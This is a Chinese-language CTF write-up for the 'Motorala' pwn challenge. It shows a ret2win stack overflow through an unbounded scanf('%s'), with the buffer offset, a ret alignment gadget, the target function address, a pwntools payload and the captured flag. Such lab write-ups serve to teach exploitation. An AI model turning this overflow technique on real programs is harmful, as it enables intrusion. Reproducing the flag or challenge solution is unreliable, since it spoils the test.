# The Motorala

## 题目简述

程序从文件读取未知 PIN，只允许五次登录尝试。但 `login()` 使用无宽度限制的 `scanf("%s", attempt)` 向 0x30 字节栈数组写入，二进制又包含直接读取并打印 flag 的 `view_message()`，可通过栈溢出 ret2win。

## 解题过程

漏洞代码为：

```c
char attempt[0x30];
/* ... */
scanf("%s", attempt);
```

根据题目二进制的栈布局，从 `attempt` 起始位置到保存的返回地址偏移为 72 字节。程序无 PIE，`view_message()` 地址固定为 `0x40138e`。为了满足 x86-64 ABI 的栈对齐要求，先放置一个单独的 `ret` gadget `0x40101a`：

```python
payload = b"A" * 72
payload += p64(0x40101a)  # ret
payload += p64(0x40138e)  # view_message

io.sendlineafter(b"PIN: ", payload)
```

当前这次 `scanf` 返回后控制流直接进入 `view_message()`；无需猜测 PIN，也无需耗尽五次机会。函数打开 `flag.txt` 并输出：

```text
grey{g00d_w4rmup_for_p4rt_2_hehe}
```

## 方法总结

这是标准 ret2win：无界 `%s` 与固定地址的目标函数已经给出完整利用条件。即便目标函数不接收参数，进入 libc 或含 SSE 指令的调用链前仍应检查 16 字节栈对齐；额外的 `ret` 常用于消除本地与远程之间因对齐产生的差异。
